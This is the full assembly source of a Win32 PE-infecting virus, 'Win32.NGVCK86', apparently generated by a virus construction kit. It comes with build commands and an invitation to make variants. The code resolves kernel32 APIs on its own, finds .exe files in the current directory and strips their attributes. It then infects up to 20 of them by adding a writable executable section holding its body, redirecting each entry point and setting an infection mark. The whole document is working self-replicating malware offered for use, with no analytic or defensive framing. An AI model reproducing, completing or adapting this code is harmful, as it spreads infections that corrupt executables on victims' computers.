              
;
;
; Win32.NGVCK86 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK86
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 33
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 push 0
 pop edx
 div ebx
                                        ; add eax, 1
 add eax, 1d
 mul ebx
 or ecx, edx                            ; Trash
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 Misc1       dd 0h
 AlignReg1   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Attributes  dd 0h
 K32Trys     dd 0h
 ATableVA    dd 0h
 OldEIP      dd 0h
 NTableVA    dd 0h
 KernelMZ    dd 0h
 filemask    db '*.exE',0
 PEheader    dd 0h

 APINames:
 db 18d, 'SetFileAttributesA'
 db 13d, 'MapViewOfFile'
 db 11d, 'CreateFileA'
 db 13d, 'FindNextFileA'
 db 18d, 'GetFileAttributesA'
 db 11d, 'CloseHandle'
 db 14d, 'FindFirstFileA'
 db 15d, 'UnmapViewOfFile'
 db 18d, 'CreateFileMappingA'
 db 09d, 'FindClose'

 FileHandle  dd 0h
 OTableVA    dd 0h
 db 'Win32.NGVCK86 created by SnakeByte',0
 MapAddress  dd 0h
 TempAPI     dd 0h

 KernelPE    dd 0h
 InfCounter  dd 0h
 sectionalign   dd 0h
 NewSize     dd 0h
 counter     dw 0h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 MapHandle   dd 0h
 FindHandle  dd 0h
 AlignReg2   dd 0h
 OldBase     dd 400000h
 NewEIP      dd 0h
 Trash1      dd 0h

 APIOffsets:
 XSetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XGetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h

 filealign   dd 0h




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi

                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 sub ebp, -1d
 dec ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 jmp ebx



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear ebx
 xor ebx, ebx
 xor ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [ebx+3Ch]
 add eax, ebx
                                        ; get File Alignment
                                        ; add eax, 60
 dec eax
 add eax, 61d
 mov ecx, [eax]
 inc eax
 sub eax, 61d
 push ecx
 pop dword ptr [ebp+filealign]
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], ebx
                                        ; get old Entrypoint
 mov ecx, dword ptr [ebx+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov eax, dword ptr [ebx+34h]
 push eax
 pop dword ptr [ebp+OldBase]
 mov edx, [ebx+38h]
 mov dword ptr [ebp+sectionalign], -1
 and dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ecx, [ebx+74h]
 shl ecx, 3
                                        ; clear edx
 mov edx, 45632d
 sub edx, 45632d
 mov dx, word ptr [ebx+6h]
 mov eax, 28h
 pushad
 mov eax, edx
 mul eax
 mov dword ptr [ebp+Misc1], eax
 popad
                                        ; clear edx
 mov edx, -56536d
 add edx, 56536d
 xor edx, dword ptr [ebp+Misc1]
 add ebx, 78h
 add ebx, ecx
 add ebx, edx
 lea eax, [ebp+newsection]
 xchg ecx, eax


 xchg ecx, ebx
 push ecx
                                        ; Calculate the RVA of the new section
 mov eax, [ecx-5*8+8d]
 add eax, [ecx-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 push eax
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+nsphysicalsize], 0
 add edx, edx                           ; Trash
 xor dword ptr [ebp+nsphysicalsize], eax
 sub edx, ebx                           ; Trash
 Call Align
                                        ; mov eax, -1
 mov eax, ( -1d + 4d )
 sub eax, 4d
 and eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], eax
                                        ;  calculate the virtual size of the new section
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ebx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], ebx
                                        ; calculate physical offset
 mov ebx,[ecx-5*8+20d]
 add ebx,[ecx-5*8+16d]
 mov eax,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], eax
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 push ecx
 pop dword ptr [ebp+nsphysicaloffset]
                                        ; calculate new size
 mov eax, dword ptr [ebp+filealign]
 mov edx, ecx
 mov dword ptr [ebp+AlignReg2], eax
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 mov edx, offset newsection
 add edx, ebp

 pop ecx
                                        ; mov eax, 64
 mov eax, ( 64d - 39d )
 add eax, 39d
WriteNewSectionLoop:
 mov bl, byte ptr [edx]
 mov byte ptr [ecx], bl
 dec eax
                                        ; add edx, 1
 inc edx
                                        ; add ecx, 1
 sub ecx, -1d
 or eax, eax
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 mov edx, dword ptr [ebp+PEheader]
 inc word ptr [edx+06h]
 push dword ptr [ebp+nsRVA]
 pop eax
 mov dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [edx+28h], eax
                                        ; set infection mark
 mov dword ptr [edx+4Ch], 'NGVC'
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 mov esi, offset Virus
 add esi, ebp


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov edx, -1
 mov edx, ( -1d xor 38d )
 xor edx, 38d
 and edx, dword ptr [ebp+InfCounter]
 dec edx
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 pop ecx
 stc
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Lenght of API-Name
                                        ; edx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
 neg ecx                                ; Trash
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h



                                        ; clear ecx
 mov ecx, -52015d
 add ecx, 52015d
 add ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov eax, [ecx+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 add eax, 28d
                                        ; get ATableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
                                        ; add eax, 4
 add eax, 4d
 mov dword ptr [ebp+ATableVA], ecx
                                        ; get NTableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
                                        ; add eax, 4
 add eax, 4d
 adc dword ptr [ebp+Trash1], 134241     ; Trash
                                        ; get OTableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
                                        ; mov eax, ecx
 push ecx
 pop eax
                                        ; mov esi, ecx
 mov esi, ecx
 push ebx
 push esi
 push edx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov cl, byte ptr [esi]
 cmp cl, byte ptr [edx]
 jne ApiNotFound
 add ebx, -1
 test ebx, ebx
 jz FoundApi1
                                        ; add edx, 1
 inc edx
                                        ; add esi, 1
 add esi, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edx
 pop esi
 pop ebx
 pop eax
                                        ; add eax, 4
 inc eax
 add eax, 3d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 16d
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 xchg eax, esi
 movzx eax, word ptr [esi]
 sal eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [eax]
 add ecx, dword ptr [ebp+KernelMZ]
 push ecx
 pop dword ptr [ebp+TempAPI]
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 mov ebx, 45653d
 sub ebx, 45653d

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 sub ebx, -1d
 push ebx
 push 80000000h or 40000000h
 lea edx, [ebp+WFD_szFileName]

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx

                                        ; clear ecx
 mov ecx, 0
 push ecx
 push edx
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 xor ebx, ebx                           ; Trash
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 add dword ptr [ebp+MapHandle], eax
 pop edx
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz CloseFile
 push edx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 add eax, -1
 add eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 mov edi, offset APIOffsets
 add edi, ebp

 lea eax, [ebp+APINames]
 xchg edx, eax
 sal ebx, 13d                           ; Trash


GetApisLoop: 

                                        ; clear ebx
 mov ebx, 0
 mov bl, byte ptr [edx]
                                        ; add edx, 1
 add edx, 1d

                                        ; search 'em
                                        ; ebx contains Name-Lenght
                                        ; edx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
 add edx, ebx
 mov esi, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], -1
 and dword ptr [edi], esi
                                        ; add edi, 4
 add edi, 4d
 loop GetApisLoop
 mov eax, ebp
 add eax, offset Outbreak

 push eax
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov esi, 20
 mov esi, 0
 add esi, 20d
 mov dword ptr [ebp+InfCounter], esi
 lea eax, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
 or eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 or eax, eax
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea esi, [ebp+WFD_szFileName]
 xchg esi, edi

                                        ; mov edx, 276
 mov edx, ( 276d - 21d )
 add edx, 21d

ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 sub edi, -1d
 dec edx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg ebx, edx

 push ebx
                                        ; clear eax
 mov eax, 56256d
 sub eax, 56256d
 add eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]

 push ecx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 inc esp
 sub esp, 5d
                                        ; store old EIP and ImageBase
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx

 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx


                                        ; round to pages
 sub cx, cx
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 4h

GK1:                                    ; check for DOS-EXE Stub
 push dword ptr [ebp+K32Trys]
 pop edx
 or edx, edx
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je CheckPE

GK2:
 dec ecx
 sub ecx, 65535d
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ecx, 60
 dec ecx
 add ecx, 61d
 mov ebx, [ecx]
                                        ; mov edx, 60
 mov edx, 0
 add edx, 60d
 sub ecx, edx
 add ebx, ecx
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelPE], -1
 and dword ptr [ebp+KernelPE], ebx
 push ecx
 pop dword ptr [ebp+KernelMZ]

 jmp GetApis

;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 mov eax, offset WFD_szFileName
 xor edx, eax                           ; Trash
 add eax, ebp

 push eax
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ecx, 128
 push 128d
 pop ecx
 push ecx
 mov ebx, ebp
 add ebx, offset WFD_szFileName


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 sub eax, 1
 inc eax
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov eax, dword ptr [ebp+MapAddress]
 add ecx, eax                           ; Trash
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; clear ebx
 mov ebx, -7626d
 add ebx, 7626d
 test ebx, ebx
 jz Notagoodfile

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 mov ecx, dword ptr [eax+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ecx
 jb Notagoodfile
 add ecx, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je Goodfile2
                                        ; clear edx
 xor edx, edx
 dec edx
 inc edx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov edx, dword ptr [ebp+Attributes]
 push edx
 lea edx, [ebp+WFD_szFileName]

 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

